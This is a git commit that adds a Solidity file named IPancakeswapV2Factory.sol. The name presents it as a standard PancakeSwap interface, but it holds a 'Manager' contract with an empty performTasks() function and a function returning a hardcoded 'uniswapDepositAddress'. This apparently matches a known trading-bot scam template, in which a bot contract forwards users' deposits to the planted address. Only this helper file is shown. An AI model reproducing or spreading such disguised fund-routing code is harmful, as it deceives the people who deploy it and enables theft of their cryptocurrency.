af4d479d970c608f2fb055f64f7cc3e9d0f2303d
iskfnfnjr <102003678+iskfnfnjr@users.noreply.github.com>
2022-04-23 19:47:07 +0800

    Create IPancakeswapV2Factory.sol

---
+++ IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x6d897A9928DBAfD050a2bEe699f434a611eDa2F4;
+	}
+}
